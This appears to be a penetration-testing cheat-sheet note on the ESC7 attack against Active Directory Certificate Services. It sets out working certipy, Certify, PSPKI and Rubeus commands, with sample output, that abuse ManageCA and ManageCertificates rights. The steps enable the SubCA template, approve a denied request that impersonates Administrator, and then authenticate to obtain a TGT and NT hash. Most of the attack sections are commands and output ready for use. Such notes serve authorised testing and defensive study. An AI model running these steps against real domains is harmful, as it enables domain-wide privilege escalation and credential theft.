### Content

- [Overview](#overview)
	- [ManageCertificates](#managecertificates)
	- [ManageCA](#manageca)
	- [Requirements](#requirements)
- [From Linux](#from-linux)
	- [Linux - Enumeration](#linux---enumeration)
	- [Linux - ManageCA Abuse](#linux---manageca-abuse)
	- [Linux - ManageCertificates Abuse](#linux---managecertificates-abuse)
- [From Windows](#from-windows)
	- [Windows - Enumeration](#windows---enumeration)
	- [Windows - Abuse](#windows---abuse)

> CA DACLs Abuse

---
### Overview

ESC7 is all about getting direct access to the CA itself. If an attacker can get one of the following permissions over the CA, he basically own the entire certificate infrastructure.

##### ManageCertificates

Usually set for the `Certificate Manager` role. `ManageCertificates` role grants the ability to approve pending certificate requests

##### ManageCA

- Usually set for the `CA Administrator` role.
- `CA Administrator` role has the ability to invoke `ICertAdminD2::SetConfigEntry` method to manage the CA's configurations' entries. one of them is `Config_CA_Accept_Request_Attributes_SAN`, which holds a Boolean value dictating whether the CA will accept request attributes that define the certificate's Subject Alternative Name (SAN).
- A principal holding this right can toggle the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag leading to `ESC6`.

#### Requirements

Compromise a principal with one of the previously mentioned permissions:

- `ManageCA` right over the `CA`, so we can remotely manipulate the `EDITF_ATTRIBUTESUBJECTALTNAME2` bit to enable SAN (Subject Alternative Name) specification in any template (refer to ESC6).
- `ManageCertificates` right over the `CA`, so we can remotely approve pending certificate requests, bypassing the protection of `CA certificate manager approval`.

---
### From Linux
#### Linux - Enumeration

```bash
# if the ManageCertificates rights aren't in the output, that mean it's set to the default, only (Domain Admins, Enterprise Admins, and Administrators) have the rights to approve certificate requests.
$ certipy find -u 'user1@lab.local' -p 'pass' -stdout -vulnerable
<SNIP>
Certificate Authorities                        
  0                                            
    CA Name                             : lab-LAB-DC-CA                                        
    DNS Name                            : LAB-DC.lab.local                                     
    Certificate Subject                 : CN=lab-LAB-DC-CA, DC=lab, DC=local                   
    <SNIP>                                            
    Permissions                                
      Owner                             : LAB.LOCAL\Administrators                             
      Access Rights                            
        Enroll                          : LAB.LOCAL\Authenticated Users                        
                                          LAB.LOCAL\user1
                                          LAB.LOCAL\user_manageCA                              
        ManageCa                        : LAB.LOCAL\user1 ### <<<<<<<<                                 
      <SNIP>
      
# Verify if the SubCA certificate is present in this ADCS server and if it is enabled.
$ certipy find -u 'user1@lab.local' -p 'pass' -stdout
<SNIP>
    Template Name                       : SubCA
    Display Name                        : Subordinate Certification Authority
    Certificate Authorities             : lab-LAB-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : True
    Any Purpose                         : True
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Private Key Flag                    : ExportableKey
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    <SNIP>
```

#### Linux - ManageCA Abuse

> If a user has the `ManageCA` right, he can grant any user the `ManageCertificates` right.

There are several ways to abuse the `ManageCA` privilege against a CA.

1. Enable the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag, which leads to ESC6. However, this flag will change after a restart of the CA service (`CertSvc`) before it can be exploited.
2. Abusing failed certificate requests.
	1. Request a certificate from a template that has SAN specifying enabled. Which will fail but you will need to save the request ID and private key.
	2. Grant your user `ManageCertificates` rights. which will give you the ability to approve the denied/pending certificate, then you can request it to use it for authentication.

> The built-in `SubCA` template is enabled by default and is vulnerable to ESC1 (even if it's not enabled, a user having `ManageCA` can enable any disabled template), as it permits the requester to specify a (SAN). While enrollment in `SubCA` is strictly restricted to `Domain Admins` and `Enterprise Admins`, which means that any request by a unprivileged attacker will be denied. An account with (`ManageCA` + `ManageCertificates`) privileges will bypass that. The attacker simply submits a certificate request against the `SubCA` template with the SAN set to a privileged target, then leverages their combined privileges to forcefully approve and issue the failed request certificate.

```bash
# Enable any disabled template using the ManageCA rights:
$ certipy ca -u 'user1@lab.local' -p 'pass' -ca lab-LAB-DC-CA -enable-template 'SubCA'

# Assign ManageCertificate rights to any account using an account that has ManageCA rights.
$ certipy ca -u 'user1@lab.local' -p 'pass' -ca lab-LAB-DC-CA -add-officer user1

# Requesting a certificate with SAN, which will failed because our current user isn't an Administrator to request a Cert from the SubCA template
$ certipy req -u 'user1@lab.local' -p 'pass' -ca lab-LAB-DC-CA -template SubCA -upn Administrator
<SNIP>
[-] ..... code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED .....
[*] Request ID is 99
Would you like to save the private key? (y/N) y
[*] Saved private key to 99.key
[-] Failed to request certificate
<SNIP>

# Using ManageCertificates rights, we can issue that failed Certificate anyway
$ certipy ca -u 'user1@lab.local' -p 'pass' -ca lab-LAB-DC-CA -issue-request 99

# retrieve the issued certificate and authenticate using it.
$ certipy req -u 'user1@lab.local' -p 'pass' -ca lab-LAB-DC-CA -retrieve 99

$ certipy auth -username Administrator -pfx administrator.pfx -domain lab.local 
```

#### Linux - ManageCertificates Abuse

If the controlled account has the `ManageCertificates` rights, request a certificate from a template that matches all requirements for ESC1 except manager approval, as we already have an account with those rights.

```bash
# Assign ManageCertificate rights to any account using an account that has ManageCA rights.
$ certipy ca -u 'user1@lab.local' -p 'pass' -ca lab-LAB-DC-CA -add-officer user1

# Request a certificate with the manager's approval
$ certipy req -u 'user1@lab.local' -p 'pass' -ca lab-LAB-DC-CA -template <templateName> -upn Administrator
<SNIP>
[!] Certificate request is pending approval
[*] Request ID is 11
Would you like to save the private key? (y/N) y
[*] Saved private key to 11.key
[-] Failed to request certificate

# Approve pending request
$ certipy ca -u 'user1@lab.local' -p 'pass' -ca lab-LAB-DC-CA -issue-request 11  

# retrieve the issued certificate and authenticate using it.
$ certipy req -u 'user1@lab.local' -p 'pass' -ca lab-LAB-DC-CA -retrieve 11
$ certipy auth -username Administrator -pfx administrator.pfx -domain lab.local 
```

---
### From Windows
#### Windows - Enumeration

Using `Certify.exe`

```PowerShell
PS C:\> .\Certify.exe cas
<SNIP>
    CA Permissions                :
      Owner: BUILTIN\Administrators

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators
      Allow  ManageCA, ManageCertificates               LAB\Domain Admins
      Allow  ManageCA, ManageCertificates               LAB\Enterprise Admins
      Allow  ManageCA, Enroll                           LAB\user1
      Allow  ManageCA, Enroll                           LAB\user_manageCA
      Allow  ManageCA, Enroll                           LAB\juanmy
      Allow  ManageCertificates, Enroll                 LAB\josy
      Allow  ManageCA, Enroll                           LAB\james
    Enrollment Agent Restrictions : None
<SNIP>
```

Using [PSPKI's PowerShell module](https://github.com/PKISolutions/PSPKI)

```PowerShell
PS C:\> Get-CertificationAuthority -ComputerName LAB-DC.lab.local | Get-CertificationAuthorityAcl | select -ExpandProperty access

<SNIP>
Rights            : ManageCA, ManageCertificates
AccessControlType : Allow
IdentityReference : LAB\Enterprise Admins
<SNIP>

Rights            : ManageCA, Enroll
AccessControlType : Allow
IdentityReference : LAB\user1
<SNIP>

Rights            : ManageCertificates, Enroll
AccessControlType : Allow
IdentityReference : LAB\josy
<SNIP>
```

Using `certutil.exe` to enumerate the value of the CA's flags:

```PowerShell  
PS C:\> certutil -config "LAB-DC.lab.local\LAB-DC.lab.local" -getreg policy\EditFlags
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\lab-LAB-DC-CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\EditFlags:

  EditFlags REG_DWORD = 15014e (1376590)
	<SNIP>
    EDITF_ATTRIBUTESUBJECTALTNAME2 -- 40000 (262144) #<<<<<<<<<<<<<<<<<<<<<<
    <SNIP>
```

Using PowerShell to query `EDITF_ATTRIBUTESUBJECTALTNAME2` flag

```PowerShell
PS C:\> $ConfigReader = New-Object SysadminsLV.PKI.Dcom.Implementations.CertSrvRegManagerD "LAB-DC"
PS C:\> $ConfigReader.SetRootNode($true)
PS C:\> $ConfigReader.GetConfigEntry("EditFlags","PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")
1376590
```

#### Windows - Abuse

```PowerShell
# Disable or enable EDITF_ATTRIBUTESUBJECTALTNAME2 with PowerShell (1376590, Enable) (1114446, Disable)
PS C:\> $ConfigReader.SetConfigEntry(1376590,"EditFlags","PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")

# Adding ManageCertificates rights using PSPKI module
# Elevated privileges in the domain required when doing this from the domain controller. 
PS C:\> Get-CertificationAuthority LAB-DC.LAB.LOCAL | Get-CertificationAuthorityAcl  | Add-CertificationAuthorityAcl -Identity "user1" -AccessType Allow -AccessMask "ManageCertificates" |  Set-CertificationAuthorityAcl -RestartCA

# Request a certificate with a template that requires approval
PS C:\> .\Certify.exe request /ca:LAB-DC\lab-LAB-DC-CA /template:<templateName> /altname:Administrator
# Get the request ID and save the RSA PRIVATE KEY in a "Name.pem" file.

# Enumerate Pending Requests using Get-PendingRequest from PSPKI module
PS C:\> Get-CertificationAuthority -ComputerName LAB-DC.lab.local | Get-PendingRequest
RequestID              : 100
Request.RequesterName  : LAB\user1
<SNIP>

# Approve the pending request using Approve-CertificateRequest from PSPKI module
PS C:\> Get-CertificationAuthority -ComputerName LAB-DC.lab.local | Get-PendingRequest -RequestID 100 | Approve-CertificateRequest

# Download Pending Request
PS C:\> .\Certify.exe download /ca:LAB-DC\lab-LAB-DC-CA /id:100
# Append the CERTIFICATE content to the "Name.pem" file from before.
```

Convert PEM to PFX with one of the ways specified in the note [PEM to PFX](PEM%20to%20PFX.md) 

```PowerShell
# Request TGT and NT Hash for the user
PS C:\> .\Rubeus.exe asktgt /user:administrator /certificate:approved.pfx /getcredentials
```